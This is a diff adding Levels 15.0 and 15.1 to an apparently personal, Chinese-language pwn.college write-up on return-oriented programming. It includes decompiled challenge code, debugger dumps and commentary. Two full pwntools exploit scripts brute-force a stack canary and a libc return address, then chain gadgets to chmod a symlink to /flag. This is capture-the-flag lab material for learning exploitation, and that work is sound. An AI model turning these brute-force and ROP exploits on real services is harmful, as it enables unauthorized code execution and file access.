@@ -1,7 +1,7 @@
 ---
-title: "Write-ups: Program Security (Return Oriented Programming) series"
+title: "Write-ups: Program Security (Return Oriented Programming) series (Completed)"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-27 23:27"
+modDate: "2025-01-28 23:14"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -5184,3 +5184,697 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{IcjKEpDUZ1r43p0FESk4RB96-1s.0FO2MDL5cTNxgzW}`
+
+## Level 15.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform ROP when the stack frame returns to libc!
+
+### Write-up
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+0h] [rbp-C0h] BYREF
+  const char **v5; // [rsp+8h] [rbp-B8h]
+  const char **v6; // [rsp+10h] [rbp-B0h]
+  int v7; // [rsp+1Ch] [rbp-A4h]
+  int optval; // [rsp+2Ch] [rbp-94h] BYREF
+  int fd; // [rsp+30h] [rbp-90h]
+  int v10; // [rsp+34h] [rbp-8Ch]
+  int v11; // [rsp+38h] [rbp-88h]
+  int v12; // [rsp+3Ch] [rbp-84h]
+  const char **v13; // [rsp+40h] [rbp-80h]
+  const char **v14; // [rsp+48h] [rbp-78h]
+  sockaddr addr; // [rsp+50h] [rbp-70h] BYREF
+  _BYTE buf[88]; // [rsp+60h] [rbp-60h] BYREF
+  unsigned __int64 v17; // [rsp+B8h] [rbp-8h]
+  __int64 savedregs; // [rsp+C0h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+C8h] [rbp+8h] BYREF
+
+  v7 = argc;
+  v6 = argv;
+  v5 = envp;
+  v17 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts("This challenge is listening for connections on TCP port 1337.\n");
+  puts("The challenge supports unlimited sequential connections.\n");
+  fd = socket(2, 1, 0);
+  optval = 1;
+  setsockopt(fd, 1, 15, &optval, 4u);
+  addr.sa_family = 2;
+  *(_DWORD *)&addr.sa_data[2] = 0;
+  *(_WORD *)addr.sa_data = htons(0x539u);
+  bind(fd, &addr, 0x10u);
+  listen(fd, 1);
+  while ( 1 )
+  {
+    v10 = accept(fd, 0LL, 0LL);
+    if ( !fork() )
+      break;
+    close(v10);
+    wait(0LL);
+  }
+  dup2(v10, 0);
+  dup2(v10, 1);
+  dup2(v10, 2);
+  close(fd);
+  close(v10);
+  v11 = v7;
+  v13 = v6;
+  v14 = v5;
+  puts(
+    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
+  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
+  sp_ = (__int64)&v4;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v4) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts(
+    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
+  puts(
+    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
+  puts(
+    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
+  puts(
+    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
+  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
+  v12 = read(0, buf, 0x1000uLL);
+  printf("Received %d bytes! This is potentially %d gadgets.\n", v12, (unsigned __int64)&buf[v12 - rp_] >> 3);
+  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
+  puts("from within this challenge. You will have to do that by yourself.");
+  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v12 - rp_] >> 3) + 1);
+  puts("Leaving!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+与上一题的区别在于上一题会返回到 binary 的 `main` 中，而这题直接把所有逻辑都写在 `main` 里面了，那就会返回到 `libc`。
+
+因为上题会返回到 `main`，里面有一些输出信息，所以我们很容易判断返回地址的下一字节是否爆破成功，但这题返回到 `libc`，默认是要执行 `exit()` 的，不会产生任何输出信息，直接爆破肯定是得不到完整返回地址的。难点就在这里，怎么确定我的爆破是否成功了，以便继续爆破下一字节？
+
+经实测发现，`pwntools` 在检测到 `fork` 出新的子进程后 debug log 会输出这样一段信息：
+
+```plaintext showLineNumbers=false wrap=false
+b'     42242:\t\n'
+b'     42242:\ttransferring control: /challenge/babyrop_level15.0\n'
+b'     42242:\t\n'
+```
+
+LMAO，看到这段美丽的 debug log 我就知道这题已经到手了！
+
+所以我们只要根据上面这个 transferring control 信息就能判断程序是否成功返回到 `fork()` 了。然后实际编写 exp 的时候我还发现，在成功返回到 `fork()` 生成了新的 `main` 进程后后续的连接都会变得十分缓慢/碰运气，这是因为有两个进程同时监听来自指定端口的连接，产生了条件竞争，我们杀掉一个就好了。幸运的，pwntools 的 debug log 除了提示我们 fork 出了一个新的进程外，还把 fork 出来的子进程的 PID 也告诉我们了，所以我们直接把这个子进程 kill 掉就好了。这无疑为我们编写自动化脚本提供了极大的便利，否则就要手动 kill 了，我看 discord 社区还真有人这么干，显然是没发现 pwntools 的强大……
+
+有关爆破返回地址这里其实还有一个坑，如果你看 `got` 表：
+
+```asm showLineNumbers=false wrap=false {25}
+pwndbg> got -r
+State of the GOT of /home/cub3y0nd/Projects/pwn.college/babyrop_level15.0:
+GOT protection: Full RELRO | Found 28 GOT entries passing the filter
+[0x60fada8bdf20] putchar@GLIBC_2.2.5 -> 0x763654694280 (putchar) ◂— endbr64
+[0x60fada8bdf28] __errno_location@GLIBC_2.2.5 -> 0x763654632400 (__errno_location) ◂— endbr64
+[0x60fada8bdf30] puts@GLIBC_2.2.5 -> 0x763654692420 (puts) ◂— endbr64
+[0x60fada8bdf38] setsockopt@GLIBC_2.2.5 -> 0x76365472e960 (setsockopt) ◂— endbr64
+[0x60fada8bdf40] cs_free -> 0x763654a5aba0 (cs_free) ◂— endbr64
+[0x60fada8bdf48] __stack_chk_fail@GLIBC_2.4 -> 0x76365473dc90 (__stack_chk_fail) ◂— endbr64
+[0x60fada8bdf50] htons@GLIBC_2.2.5 -> 0x76365473dcf0 (ntohs) ◂— endbr64
+[0x60fada8bdf58] dup2@GLIBC_2.2.5 -> 0x76365471cae0 (dup2) ◂— endbr64
+[0x60fada8bdf60] printf@GLIBC_2.2.5 -> 0x76365466fc90 (printf) ◂— endbr64
+[0x60fada8bdf68] close@GLIBC_2.2.5 -> 0x76365471ca20 (close) ◂— endbr64
+[0x60fada8bdf70] read@GLIBC_2.2.5 -> 0x76365471c1e0 (read) ◂— endbr64
+[0x60fada8bdf78] strcmp@GLIBC_2.2.5 -> 0x763654791df0 ◂— endbr64
+[0x60fada8bdf80] cs_disasm -> 0x763654a5b000 (cs_disasm) ◂— endbr64
+[0x60fada8bdf88] mincore@GLIBC_2.2.5 -> 0x763654726cc0 (mincore) ◂— endbr64
+[0x60fada8bdf90] listen@GLIBC_2.2.5 -> 0x76365472e4e0 (listen) ◂— endbr64
+[0x60fada8bdf98] setvbuf@GLIBC_2.2.5 -> 0x763654692ce0 (setvbuf) ◂— endbr64
+[0x60fada8bdfa0] bind@GLIBC_2.2.5 -> 0x76365472e380 (bind) ◂— endbr64
+[0x60fada8bdfa8] cs_open -> 0x763654a5a6a0 (cs_open) ◂— endbr64
+[0x60fada8bdfb0] accept@GLIBC_2.2.5 -> 0x76365472e2e0 (accept) ◂— endbr64
+[0x60fada8bdfb8] cs_close -> 0x763654a5a830 (cs_close) ◂— endbr64
+[0x60fada8bdfc0] wait@GLIBC_2.2.5 -> 0x7636546f0bd0 (wait) ◂— endbr64
+[0x60fada8bdfc8] fork@GLIBC_2.2.5 -> 0x7636546f0ef0 (fork) ◂— endbr64
+[0x60fada8bdfd0] socket@GLIBC_2.2.5 -> 0x76365472e9c0 (socket) ◂— endbr64
+[0x60fada8bdfd8] _ITM_deregisterTMCloneTable -> 0
+[0x60fada8bdfe0] __libc_start_main@GLIBC_2.2.5 -> 0x763654631f90 (__libc_start_main) ◂— endbr64
+[0x60fada8bdfe8] __gmon_start__ -> 0
+[0x60fada8bdff0] _ITM_registerTMCloneTable -> 0
+[0x60fada8bdff8] __cxa_finalize@GLIBC_2.2.5 -> 0x763654654f10 (__cxa_finalize) ◂— endbr64
+```
+
+再看 `__libc_start_main` 的汇编：
+
+```asm showLineNumbers=false wrap=false {33} ins={34-40} collapse={6-29, 44-118}
+pwndbg> disass __libc_start_main
+Dump of assembler code for function __libc_start_main:
+   0x0000763654631f90 <+0>: endbr64
+   0x0000763654631f94 <+4>: push   r15
+   0x0000763654631f96 <+6>: xor    eax,eax
+   0x0000763654631f98 <+8>: push   r14
+   0x0000763654631f9a <+10>: push   r13
+   0x0000763654631f9c <+12>: push   r12
+   0x0000763654631f9e <+14>: push   rbp
+   0x0000763654631f9f <+15>: push   rbx
+   0x0000763654631fa0 <+16>: mov    rbx,rcx
+   0x0000763654631fa3 <+19>: sub    rsp,0x98
+   0x0000763654631faa <+26>: mov    QWORD PTR [rsp+0x8],rdx
+   0x0000763654631faf <+31>: mov    rdx,QWORD PTR [rip+0x1c7f8a]        # 0x7636547f9f40
+   0x0000763654631fb6 <+38>: mov    QWORD PTR [rsp+0x18],rdi
+   0x0000763654631fbb <+43>: mov    rdi,r9
+   0x0000763654631fbe <+46>: mov    DWORD PTR [rsp+0x14],esi
+   0x0000763654631fc2 <+50>: test   rdx,rdx
+   0x0000763654631fc5 <+53>: je     0x763654631fd0 <__libc_start_main+64>
+   0x0000763654631fc7 <+55>: mov    edx,DWORD PTR [rdx]
+   0x0000763654631fc9 <+57>: xor    eax,eax
+   0x0000763654631fcb <+59>: test   edx,edx
+   0x0000763654631fcd <+61>: sete   al
+   0x0000763654631fd0 <+64>: mov    DWORD PTR [rip+0x1c81ca],eax        # 0x7636547fa1a0
+   0x0000763654631fd6 <+70>: test   rdi,rdi
+   0x0000763654631fd9 <+73>: je     0x763654631fe4 <__libc_start_main+84>
+   0x0000763654631fdb <+75>: xor    edx,edx
+   0x0000763654631fdd <+77>: xor    esi,esi
+   0x0000763654631fdf <+79>: call   0x763654654de0 <__cxa_atexit>
+   0x0000763654631fe4 <+84>: mov    rdx,QWORD PTR [rip+0x1c7e75]        # 0x7636547f9e60
+   0x0000763654631feb <+91>: mov    ebp,DWORD PTR [rdx]
+   0x0000763654631fed <+93>: and    ebp,0x2
+   0x0000763654631ff0 <+96>: jne    0x76365463208a <__libc_start_main+250>
+   0x0000763654631ff6 <+102>: test   rbx,rbx
+   0x0000763654631ff9 <+105>: je     0x763654632010 <__libc_start_main+128>
+   0x0000763654631ffb <+107>: mov    rax,QWORD PTR [rip+0x1c7eae]        # 0x7636547f9eb0
+   0x0000763654632002 <+114>: mov    rsi,QWORD PTR [rsp+0x8]
+   0x0000763654632007 <+119>: mov    edi,DWORD PTR [rsp+0x14]
+   0x000076365463200b <+123>: mov    rdx,QWORD PTR [rax]
+   0x000076365463200e <+126>: call   rbx
+   0x0000763654632010 <+128>: mov    rdx,QWORD PTR [rip+0x1c7e49]        # 0x7636547f9e60
+   0x0000763654632017 <+135>: mov    eax,DWORD PTR [rdx+0x210]
+   0x000076365463201d <+141>: test   eax,eax
+   0x000076365463201f <+143>: jne    0x7636546320ec <__libc_start_main+348>
+   0x0000763654632025 <+149>: test   ebp,ebp
+   0x0000763654632027 <+151>: jne    0x763654632150 <__libc_start_main+448>
+   0x000076365463202d <+157>: lea    rdi,[rsp+0x20]
+   0x0000763654632032 <+162>: call   0x763654650c80 <_setjmp>
+   0x0000763654632037 <+167>: endbr64
+   0x000076365463203b <+171>: test   eax,eax
+   0x000076365463203d <+173>: jne    0x7636546320a6 <__libc_start_main+278>
+   0x000076365463203f <+175>: mov    rax,QWORD PTR fs:0x300
+   0x0000763654632048 <+184>: mov    QWORD PTR [rsp+0x68],rax
+   0x000076365463204d <+189>: mov    rax,QWORD PTR fs:0x2f8
+   0x0000763654632056 <+198>: mov    QWORD PTR [rsp+0x70],rax
+   0x000076365463205b <+203>: lea    rax,[rsp+0x20]
+   0x0000763654632060 <+208>: mov    QWORD PTR fs:0x300,rax
+   0x0000763654632069 <+217>: mov    rax,QWORD PTR [rip+0x1c7e40]        # 0x7636547f9eb0
+   0x0000763654632070 <+224>: mov    rsi,QWORD PTR [rsp+0x8]
+   0x0000763654632075 <+229>: mov    edi,DWORD PTR [rsp+0x14]
+   0x0000763654632079 <+233>: mov    rdx,QWORD PTR [rax]
+   0x000076365463207c <+236>: mov    rax,QWORD PTR [rsp+0x18]
+   0x0000763654632081 <+241>: call   rax
+   0x0000763654632083 <+243>: mov    edi,eax
+   0x0000763654632085 <+245>: call   0x763654654a40 <exit>
+   0x000076365463208a <+250>: mov    rax,QWORD PTR [rsp+0x8]
+   0x000076365463208f <+255>: lea    rdi,[rip+0x18fdd2]        # 0x7636547c1e68
+   0x0000763654632096 <+262>: mov    rsi,QWORD PTR [rax]
+   0x0000763654632099 <+265>: xor    eax,eax
+   0x000076365463209b <+267>: call   QWORD PTR [rdx+0x1d0]
+   0x00007636546320a1 <+273>: jmp    0x763654631ff6 <__libc_start_main+102>
+   0x00007636546320a6 <+278>: mov    rax,QWORD PTR [rip+0x1cd3cb]        # 0x7636547ff478
+   0x00007636546320ad <+285>: ror    rax,0x11
+   0x00007636546320b1 <+289>: xor    rax,QWORD PTR fs:0x30
+   0x00007636546320ba <+298>: call   rax
+   0x00007636546320bc <+300>: mov    rax,QWORD PTR [rip+0x1cd3a5]        # 0x7636547ff468
+   0x00007636546320c3 <+307>: ror    rax,0x11
+   0x00007636546320c7 <+311>: xor    rax,QWORD PTR fs:0x30
+   0x00007636546320d0 <+320>: lock dec DWORD PTR [rax]
+   0x00007636546320d3 <+323>: sete   dl
+   0x00007636546320d6 <+326>: test   dl,dl
+   0x00007636546320d8 <+328>: jne    0x7636546320e8 <__libc_start_main+344>
+   0x00007636546320da <+330>: mov    edx,0x3c
+   0x00007636546320df <+335>: nop
+   0x00007636546320e0 <+336>: xor    edi,edi
+   0x00007636546320e2 <+338>: mov    eax,edx
+   0x00007636546320e4 <+340>: syscall
+   0x00007636546320e6 <+342>: jmp    0x7636546320e0 <__libc_start_main+336>
+   0x00007636546320e8 <+344>: xor    eax,eax
+   0x00007636546320ea <+346>: jmp    0x763654632083 <__libc_start_main+243>
+   0x00007636546320ec <+348>: mov    r13,QWORD PTR [rip+0x1c7cfd]        # 0x7636547f9df0
+   0x00007636546320f3 <+355>: mov    r12d,eax
+   0x00007636546320f6 <+358>: mov    r14,QWORD PTR [rdx+0x208]
+   0x00007636546320fd <+365>: shl    r12,0x4
+   0x0000763654632101 <+369>: mov    r15,QWORD PTR [r13+0x0]
+   0x0000763654632105 <+373>: mov    rbx,r15
+   0x0000763654632108 <+376>: add    r12,r15
+   0x000076365463210b <+379>: cmp    rbx,r12
+   0x000076365463210e <+382>: je     0x763654632025 <__libc_start_main+149>
+   0x0000763654632114 <+388>: mov    rax,QWORD PTR [r14+0x18]
+   0x0000763654632118 <+392>: test   rax,rax
+   0x000076365463211b <+395>: je     0x763654632139 <__libc_start_main+425>
+   0x000076365463211d <+397>: mov    rdx,QWORD PTR [rip+0x1c7ccc]        # 0x7636547f9df0
+   0x0000763654632124 <+404>: lea    rdi,[rbx+0x480]
+   0x000076365463212b <+411>: add    rdx,0x988
+   0x0000763654632132 <+418>: cmp    r15,rdx
+   0x0000763654632135 <+421>: je     0x763654632147 <__libc_start_main+439>
+   0x0000763654632137 <+423>: call   rax
+   0x0000763654632139 <+425>: mov    r14,QWORD PTR [r14+0x40]
+   0x000076365463213d <+429>: add    r13,0x10
+   0x0000763654632141 <+433>: add    rbx,0x10
+   0x0000763654632145 <+437>: jmp    0x76365463210b <__libc_start_main+379>
+   0x0000763654632147 <+439>: lea    rdi,[r13+0xe08]
+   0x000076365463214e <+446>: jmp    0x763654632137 <__libc_start_main+423>
+   0x0000763654632150 <+448>: mov    rax,QWORD PTR [rsp+0x8]
+   0x0000763654632155 <+453>: mov    rdx,QWORD PTR [rip+0x1c7d04]        # 0x7636547f9e60
+   0x000076365463215c <+460>: lea    rdi,[rip+0x18fd1f]        # 0x7636547c1e82
+   0x0000763654632163 <+467>: mov    rsi,QWORD PTR [rax]
+   0x0000763654632166 <+470>: xor    eax,eax
+   0x0000763654632168 <+472>: call   QWORD PTR [rdx+0x1d0]
+   0x000076365463216e <+478>: jmp    0x76365463202d <__libc_start_main+157>
+End of assembler dump.
+```
+
+真 TM 巧啊…… `fork()` 在 libc 中的固定字节正巧是 `\xf0`（爆破返回地址这种事情我不习惯固定倒数第三个 nibble，不然我早就可以意识到后续的问题了）、`__libc_start_main` 中 `\xf0` 处的指令 `jne` 正巧不会跳转、下面继续执行的正巧是 `fork()`。这一连串的巧合让我在分析的时候百思不得其解啊，为毛计算了 `fork()` 到 libc 之间的偏移就是 TMD 执行不了我的 ROP Chain……因为我在打 [Level 14](#level-140) 的时候也碰到过 exp 没问题但就是打不通的问题，多打几次就好了……我！草！又 TM 是一个巧合……最后导致我在这上面耗了大概……好几个小时？一下午？无所谓了……
+
+这说明了我对程序的细粒度还不够敏感，不过有了这次经验后以后就长记性了……毕竟我们的默认返回地址是返回到 `__libc_start_main` 中的，而我们又是从低位开始爆破，怎么着也不可能走到 libc 中的 `fork()` 吧……大概率会掉到 `__libc_start_main` 中的一个 call 里才是。确实，说不可能有点太绝对了，不够严谨。其实在满足了『天时、地利、人和』的情况下还是很有可能的，只是可能性有点小。
+
+~_最后，我觉得一切的罪魁祸首是我 ret2fork 的灵感来源于 `got` 表，真不知道该谢谢你还是……如果说有人想浪费我的时间很困难……6，被你做到了，而且非常完美……_~
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    re,
+    remote,
+    signal,
+    sleep,
+    time,
+)
+from pwnlib.gdb import psutil
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level15.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+c
+"""
+
+CANARY_OFFSET = 0x58
+LIBC_OFFSET = 0x23FF0
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    children = psutil.Process(parent_pid).children()
+
+    if len(children) != 1:
+        raise ValueError(f"Expected 1 child process, found {len(children)}")
+
+    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")
+
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                nc_process = process(["nc", HOST, str(PORT)])
+                sleep(1)
+
+                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)
+
+                return nc_process
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def brute_force(target_type, fixed_byte, canary=b""):
+    current = fixed_byte
+    length = 0x8 if target_type == "canary" else 0x6
+    start_time = time.time()
+
+    while len(current) < length:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                payload = flat(
+                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
+                    if target_type == "canary"
+                    else b"".ljust(CANARY_OFFSET, b"A")
+                    + canary
+                    + b"".ljust(0x8, b"A")
+                    + current
+                    + p8(byte)
+                )
+
+                target.send(payload)
+
+                response = target.recvall(timeout=5)
+
+                if (
+                    target_type == "canary"
+                    and b"*** stack smashing detected ***" not in response
+                ) or (target_type == "retaddr" and b"transferring control" in response):
+                    current += p8(byte)
+
+                    pattern = r"(\d+):\ttransferring control"
+                    matches = re.findall(
+                        pattern, response.decode("utf-8", errors="ignore")
+                    )
+
+                    if matches:
+                        pid = int(matches[0])
+                        os.kill(pid, signal.SIGTERM)
+                    else:
+                        log.failure(b"No matching PID found!")
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
+    )
+
+    return current
+
+
+def construct_payload(canary, leaked_libc):
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET
+
+    rop = ROP(libc)
+
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+
+    filename = next(libc.search(b"GNU"))
+    mode = 0o4
+
+    return flat(
+        b"".ljust(CANARY_OFFSET, b"A"),
+        canary,
+        b"".ljust(0x8, b"A"),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        libc.symbols["chmod"],
+    )
+
+
+def attack(canary, leaked_libc):
+    try:
+        os.system("ln -s /flag GNU")
+
+        with remote(HOST, PORT) as target:
+            payload = construct_payload(canary, leaked_libc)
+
+            target.send(payload)
+            target.recvall(timeout=1)
+
+        try:
+            with open("/flag", "r") as f:
+                log.success(f.read())
+            return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        launch(debug=False, attach=False)
+
+        canary = brute_force("canary", b"\x00")
+        leaked_libc = brute_force("retaddr", b"\xf0", canary)
+
+        if attack(canary, leaked_libc):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{wOJjH27pmDvy68va0GzxQ3gHz6_.0VO2MDL5cTNxgzW}`
+
+## Level 15.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform ROP when the stack frame returns to libc!
+
+### Write-up
+
+参见 [Level 15.0](#level-150)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p8,
+    process,
+    re,
+    remote,
+    signal,
+    sleep,
+    time,
+)
+from pwnlib.gdb import psutil
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level15.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+c
+"""
+
+CANARY_OFFSET = 0x48
+LIBC_OFFSET = 0x23FF0
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    children = psutil.Process(parent_pid).children()
+
+    if len(children) != 1:
+        raise ValueError(f"Expected 1 child process, found {len(children)}")
+
+    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")
+
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                nc_process = process(["nc", HOST, str(PORT)])
+                sleep(1)
+
+                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)
+
+                return nc_process
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def brute_force(target_type, fixed_byte, canary=b""):
+    current = fixed_byte
+    length = 0x8 if target_type == "canary" else 0x6
+    start_time = time.time()
+
+    while len(current) < length:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                payload = flat(
+                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
+                    if target_type == "canary"
+                    else b"".ljust(CANARY_OFFSET, b"A")
+                    + canary
+                    + b"".ljust(0x8, b"A")
+                    + current
+                    + p8(byte)
+                )
+
+                target.send(payload)
+
+                response = target.recvall(timeout=5)
+
+                if (
+                    target_type == "canary"
+                    and b"*** stack smashing detected ***" not in response
+                ) or (target_type == "retaddr" and b"transferring control" in response):
+                    current += p8(byte)
+
+                    pattern = r"(\d+):\ttransferring control"
+                    matches = re.findall(
+                        pattern, response.decode("utf-8", errors="ignore")
+                    )
+
+                    if matches:
+                        pid = int(matches[0])
+                        os.kill(pid, signal.SIGTERM)
+                    else:
+                        log.failure(b"No matching PID found!")
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
+    )
+
+    return current
+
+
+def construct_payload(canary, leaked_libc):
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET
+
+    rop = ROP(libc)
+
+    pop_rdi_ret = rop.rdi.address
+    pop_rsi_ret = rop.rsi.address
+
+    filename = next(libc.search(b"GNU"))
+    mode = 0o4
+
+    return flat(
+        b"".ljust(CANARY_OFFSET, b"A"),
+        canary,
+        b"".ljust(0x8, b"A"),
+        pop_rdi_ret,
+        filename,
+        pop_rsi_ret,
+        mode,
+        libc.symbols["chmod"],
+    )
+
+
+def attack(canary, leaked_libc):
+    try:
+        os.system("ln -s /flag GNU")
+
+        with remote(HOST, PORT) as target:
+            payload = construct_payload(canary, leaked_libc)
+
+            target.send(payload)
+            target.recvall(timeout=1)
+
+        try:
+            with open("/flag", "r") as f:
+                log.success(f.read())
+            return True
+        except FileNotFoundError:
+            log.exception("The file '/flag' does not exist.")
+        except PermissionError:
+            log.failure("Permission denied to read '/flag'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        launch(debug=False, attach=False)
+
+        canary = brute_force("canary", b"\x00")
+        leaked_libc = brute_force("retaddr", b"\xf0", canary)
+
+        if attack(canary, leaked_libc):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{Y_8emGu4QF43dsSwmrNIX6MC17Q.0FM3MDL5cTNxgzW}`
+
+## 后记
+
+让我算算这章又打了多久……唔，七天（减去了我中途学堆的三天）！这是不是我打的最快的一章？没印象，好像 shellcode 更快，只打了三天吧？懒得查记录了……
